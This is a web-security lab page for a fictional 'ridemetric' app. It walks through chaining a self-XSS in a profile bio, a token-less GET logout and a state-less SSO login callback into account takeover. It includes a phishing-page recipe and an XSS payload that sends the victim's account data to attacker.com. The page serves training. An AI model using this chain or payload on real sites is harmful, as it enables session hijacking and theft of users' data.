🧪 Attacker Helper

This panel lives only in the lab. In a real attack everything runs from the attacker's server.

1. Get a login-CSRF code for attacker-zero. This is a valid SSO code that, when visited, silently logs ANY browser into the attacker's account (because the callback has no state validation).

2. Simulate the victim clicking the attacker's phishing page (this runs the full chain).

Hint: Self-XSS → Login CSRF → ATO

This is the Whitton/Uber classic. Self-XSS alone is noise. Chain it with a login CSRF and you land the stored XSS inside the victim's browser. The "attacker helper" button on the dashboard runs the whole thing — but try to piece together the bugs yourself first.
1
Map the bugs›
Bug A — stored self-XSS in the bio field. Rendered via innerHTML. But you can only edit your own bio, so it fires only in your own browser.

Bug B — logout is GET-based and has no CSRF token. Any cross-origin image/fetch to /ridemetric/logout ends the victim's session.

Bug C — SSO login callback has no state parameter. /ridemetric/sso/callback?code=XYZ silently logs the browser into whatever user that code was issued for. No user interaction.
2
The core insight›
Self-XSS fires in YOUR own browser when YOU view YOUR own profile. So if you can force the victim's browser to be logged in as YOU (the attacker), when they load YOUR profile page, YOUR XSS fires in THEIR browser context. That's the "turn self-XSS into real XSS" trick.
3
Assemble the sequence›
(a) Plant stored XSS in attacker-zero's bio (done once, from your own machine).
(b) Grab a valid SSO code for attacker-zero that has not been used.
(c) Phishing page: <img src="/ridemetric/logout"> + navigate to /ridemetric/sso/callback?code=<attacker_code>.
(d) Follow with location = '/ridemetric/profile/attacker-zero' — XSS runs in victim's browser inside attacker-zero's session.
(e) XSS payload logs victim back into their original account (optional if you harvested enough already) and exfils data.
4
Payload ideas for the bio›
Once XSS fires in the victim's browser while logged-in as attacker-zero, you need to switch them back and exfil. Example: 
<img src=x onerror="
  // we are running on /ridemetric/profile/attacker-zero
  // iframe the victim's original account data via same-origin session swap
  fetch('/api/auth/me', {credentials:'include'}).then(r=>r.json()).then(d=>{
    navigator.sendBeacon('//attacker.com/log', JSON.stringify(d));
  });
">
In a real attack, you'd pre-log-them-out → re-log them INTO attacker → iframe their original profile after you re-log them back in. The attacker helper button automates this end-to-end.

Scroll down on the right sidebar → click 🧪 Attacker helper.

1. Click "Generate attacker login code" — backend issues a code for attacker-zero.

2. Click "Fire full chain on the current browser". The lab will:

  • Plant the XSS payload in attacker-zero's bio
  • CSRF-logout the victim
  • Login-CSRF into attacker-zero via the stateless SSO callback
  • Iframe the attacker profile → self-XSS fires in victim's browser
  • XSS payload exfils and postMessages back to the dashboard as proof
  • Restore the victim's original session

You'll see the exfil (username, email, earnings) appear in the log. Lab solved.
